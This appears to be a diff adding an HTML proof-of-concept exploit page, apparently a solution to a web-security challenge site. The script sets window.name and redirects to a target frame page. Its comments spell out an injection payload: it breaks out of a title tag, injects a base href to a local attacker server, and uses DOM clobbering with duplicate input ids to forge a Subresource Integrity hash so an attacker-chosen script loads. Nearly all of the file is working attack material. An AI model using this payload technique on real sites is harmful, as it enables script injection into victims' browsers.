@@ -1,0 +1,21 @@
+<html>
+
+<body>
+    <script>
+        window.name = 'iframe';
+
+        window.location = 'https://wacky.buggywebsite.com/frame.html?param=';
+
+        // </title><base%20href="http://localhost:3001"/>
+
+        // SRI hash of my local file...
+        // p51SrvURycnwd7qUqVPBINFTdhZ5bWSQ3XyIlcq6MqY=
+
+        // DOM clobbering!
+        // <input id=fileIntegrity/><input id=fileIntegrity name=value value="p51SrvURycnwd7qUqVPBINFTdhZ5bWSQ3XyIlcq6MqY="/>
+
+        // </title><base%20href="http://localhost:3001"/><input id=fileIntegrity/><input id=fileIntegrity name=value value="p51SrvURycnwd7qUqVPBINFTdhZ5bWSQ3XyIlcq6MqY="/>
+    </script>
+</body>
+
+</html>
